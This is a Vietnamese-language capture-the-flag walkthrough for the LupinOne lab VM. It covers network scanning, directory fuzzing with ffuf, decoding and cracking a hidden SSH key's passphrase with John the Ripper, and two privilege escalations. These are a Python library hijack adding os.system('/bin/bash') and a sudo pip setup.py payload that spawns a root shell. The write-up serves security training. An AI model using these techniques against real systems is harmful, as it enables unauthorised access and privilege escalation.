## Step 1
Máy LupinOne

![image](https://user-images.githubusercontent.com/97771705/222322292-994cb730-ae7e-4707-a1e6-db79ccfe6bd3.png)

Tại máy Kali, nhập lệnh **netdiscover -r 10.0.2.0/24** để tìm kiếm ip của máy Lupin

![image](https://user-images.githubusercontent.com/97771705/222322533-3a8528a7-6f13-40ae-8411-47ff2b94e9ca.png)

Sử dụng lệnh **nmap -sC -sV 10.0.2.4**

![image](https://user-images.githubusercontent.com/97771705/222322990-7565d92b-022d-4686-97f1-0a41c2b17313.png)

Ta tìm thấy 2 port:
- Port 22 có SSH server
- Port 80 có Apache Sever và 1 file /~myfiles

Ta thử đọc ~myfiles

![image](https://user-images.githubusercontent.com/97771705/222323732-50598bf4-b7bd-4fab-bd34-9e386fe4e7f1.png)

Lỗi 404 not found, tiếp tục nhấn f12 để xem source code

![image](https://user-images.githubusercontent.com/97771705/222323930-96023d8a-aa11-4335-84b0-dcdb131c1279.png)

## Step 2
Tiến hành fuzzing để tìm kiếm thư mục ẩn
Ta dùng lệnh **ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 'http://10.0.2.4/~FUZZ'**
+ Sử dụng công cụ **ffuf** để thực hiện directory attack, tìm kiếm xem có thư mục nào có tên trong list hay không
+ **-c** là khi tìm thấy thì in màu nổi bật hơn (như hình thì là màu xanh)
+ **-w** là path tới tập tin danh sách từ điển đối chiếu. Trên kali có sẵn tại path **/usr/share/wordlists/dirbuster/**, và ta chọn tệp **directory-list-2.3-small.txt**
+ **-u** là URL muốn fuzz, trong đó  **FUZZ** là vị trí cần tìm 
+ **~** được sử  dụng cho cả thư mục lẫn tệp

![image](https://user-images.githubusercontent.com/97771705/222328117-df4ea8bb-07cc-4ef3-b513-43801cdcae9a.png)

![image](https://user-images.githubusercontent.com/97771705/222328143-f96fd0da-7054-4640-ba3d-6f82b262d87d.png)

Truy cập **http://10.0.2.4/~secret** 

![image](https://user-images.githubusercontent.com/97771705/222328385-2bc8f2aa-75bf-4985-b334-a8b2c51efb95.png)

Thông tin cho ta biết SSH private key đang nằm đâu đó trong thư mục này. Ta phải tìm và crack passphrase của private key đó
Ta dùng lệnh **ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 'http://10.0.2.4/~secret/.FUZZ' -e .txt,.html**
+ **.** sử dụng cho tệp
+ **-e .txt,.html** để tìm kiếm file với đuôi txt, html

![image](https://user-images.githubusercontent.com/97771705/222330744-4bd68b23-7f11-437b-8878-4242bc1f951f.png)

Ta tìm thấy file **mysecret.txt** 
Truy cập thử 

![image](https://user-images.githubusercontent.com/97771705/222330959-c0104c45-999b-4a47-bf4e-cf60e55e1ce3.png)

Đưa lên dcode.fr, phát hiện đây là mã base58

![image](https://user-images.githubusercontent.com/97771705/222331199-b8bc25b8-40a5-4ce5-9498-983b74712268.png)

Giải mã base 58, ta được open ssh private key

![image](https://user-images.githubusercontent.com/97771705/222331415-ea5b41dc-6563-4817-9122-1c0d64906cef.png)

## Step 3
Private key này có passphrase bảo vệ. Hiểu đơn giản passphrase là một mật khẩu được sử dụng để bảo vệ và mã hóa private key SSH. Khi tạo ra private key, người dùng có thể tạo ra một passphrase để đảm bảo rằng chỉ có người dùng được ủy quyền mới có thể sử dụng private key. Khi một người dùng muốn sử dụng private key, họ sẽ được yêu cầu nhập passphrase để giải mã key trước khi sử dụng nó. Điều này giúp đảm bảo an toàn cho key trong trường hợp nó bị đánh cắp hoặc lộ ra ngoài.

Lưu SSH Private Key vào 1 file **key.txt**

Sử dụng tool **John the Ripper** để Brute-force passphrase của SSH Private Key

Command **ssh2john** của John the Ripper được sử dụng để chuyển đổi private key của SSH sang định dạng mà John the Ripper có thể sử dụng để tấn công bằng cách thử các passphrase khác nhau.

Sử dụng lệnh **/usr/share/john/ssh2john.py key.txt > pass.txt**

![image](https://user-images.githubusercontent.com/97771705/222358294-2edff0bb-f19d-4c30-846e-919554270e0e.png)

Trong **~secret** cũng đề cập tới fasttract. Đây là 1 file có sẵn trong wordlist của kali, có thể sử dụng để bruteforce

Sử dụng lệnh **john pass.txt --wordlist=/usr/share/wordlist/fasttract.txt**

![image](https://user-images.githubusercontent.com/97771705/222359062-465d986e-97f0-42a2-9432-87b0f89e346c.png)

Bruteforce thành công passphrase của SSH private key! (P@55w0rd!)

## Step 4
Sử dụng lệnh **ssh -i key.txt icex64@10.0.2.4**
+ **-i key.txt** chỉ định đường dẫn tới file chứa private key để đăng nhập vào máy chủ từ xa. File key này sẽ được sử dụng để xác thực cho việc đăng nhập, thay vì sử dụng mật khẩu.
+ icex64 là tên người dùng trên máy chủ từ xa mà ta muốn đăng nhập.
+ 10.0.2.4 là địa chỉ IP của máy chủ từ xa mà ta muốn truy cập.

Sau khi nhập đúng passphrase, đăng nhập thành công LupinOne

![image](https://user-images.githubusercontent.com/97771705/222363678-787c115d-bc33-4bcc-9898-c8cab33af860.png)

Tìm kiếm thư mục của máy 

![image](https://user-images.githubusercontent.com/97771705/222363964-ecf32a13-7716-4305-910b-e1f9a16261c1.png)

Đọc **user.txt** ta được flag đầu tiên

![image](https://user-images.githubusercontent.com/97771705/222364174-a1f92062-8d93-4db0-85a8-426f21d94908.png)

> 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}

## Step 5
Dùng vài lệnh cơ bản để kiểm tra tên người dùng và các thư mục thông thường

![image](https://user-images.githubusercontent.com/97771705/222367163-323cb1fe-e204-4379-97d2-72c42f03aaf5.png)


Sử dụng lệnh **sudo -l** để xem quyền của user icex64, nó sẽ hiển thị danh sách các lệnh mà người dùng hiện tại được phép thực thi với đặc quyền hạn của tài khoản root hoặc các tài khoản khác có quyền truy cập đặc biệt.

![image](https://user-images.githubusercontent.com/97771705/222366966-1e5d0434-28a5-425e-ba74-88a62990e783.png)

icex64 có thể run 1 tập tin python. Đọc thử

![image](https://user-images.githubusercontent.com/97771705/222367836-7f6f99a7-0a38-4ec2-ad74-c265365d97cf.png)

Ta thử tìm kiếm file có quyền rwx cho tất cả người dùng bằng lệnh **find / -type f -perm -ug=rwx**
![image](https://user-images.githubusercontent.com/97771705/222369987-c0272716-e84f-41f7-9bc2-8db7f23722f2.png)

File python mà icex64 có thể run chứa đoạn import webbrowser, đây cũng có tập tin webbrowser.py

Xem quyền sở hữu của file webbrowser.py -> người dùng root
![image](https://user-images.githubusercontent.com/97771705/222373300-17896e59-2829-45f9-b0e7-5b829d44a25e.png)

Quyền của file này là 777, tức là bản thân icex64 cũng có thể chỉnh sửa, thực thi file -> bắt đầu leo thang đặc quyền thông qua Python Library Hijacking technique

## Step 6
Sử dụng lệnh nano để chỉnh sửa tệp. Thêm **os.system("/bin/bash")**
![image](https://user-images.githubusercontent.com/97771705/222376371-137c621a-6cf8-49e0-a1cd-6a9f62cc83de.png)

```
Trong Python, "os.system()" là một hàm cho phép thực thi các lệnh hệ thống hoặc các tiến trình bên ngoài. Khi chạy lệnh "os.system("/bin/bash")", nó sẽ thực thi lệnh "/bin/bash" trên hệ thống.

Lệnh "/bin/bash" được sử dụng để mở một cửa sổ dòng lệnh Bash trên hệ thống Linux hoặc macOS. Nếu lệnh được thực thi thành công, một cửa sổ dòng lệnh Bash mới sẽ được mở ra, cho phép người dùng nhập các lệnh để thực thi trên hệ thống.
```

Nhập lệnh **sudo -u arsene /usr/lib/python3.9 /home/arsene/heist.py**
![image](https://user-images.githubusercontent.com/97771705/222379224-0d08f4ec-aa8c-4e69-881c-de6ef03cbad4.png)

Xem 1 vài file trên home của arsene

![image](https://user-images.githubusercontent.com/97771705/222381533-ea7d720e-4c14-4377-bc9c-013b85778e7e.png)

User arsene có quyền root thực thi file /usr/bin/pip

![image](https://user-images.githubusercontent.com/97771705/222385595-4529dc20-92f1-4ac3-8a53-97dbf18e2b5c.png)

Thực thi 3 lệnh sau
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
![image](https://user-images.githubusercontent.com/97771705/222388785-008e7b0d-f9db-4e0a-a264-252e2c3c550c.png)
![image](https://user-images.githubusercontent.com/97771705/222388841-cd4fd85f-eb76-4f24-a07c-f66b3d6e45a0.png)

>3mp!r3{congratulations_you_message_to_pwn_the_lupin1_box}


